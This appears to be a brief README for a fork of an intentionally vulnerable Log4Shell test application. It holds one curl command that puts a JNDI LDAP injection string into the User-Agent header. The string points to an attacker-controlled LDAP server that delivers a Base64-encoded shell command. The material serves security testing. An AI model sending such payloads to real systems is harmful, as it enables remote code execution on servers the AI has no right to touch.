A fork of https://github.com/christophetd/log4shell-vulnerable-app with exploitable User-Agent
...
curl 127.0.0.1:8080 -A '${jndi:ldap://your-private-ip:1389/Basic/Command/Base64/dG91Y2ggL3RtcC9wd25lZAo=}'
```
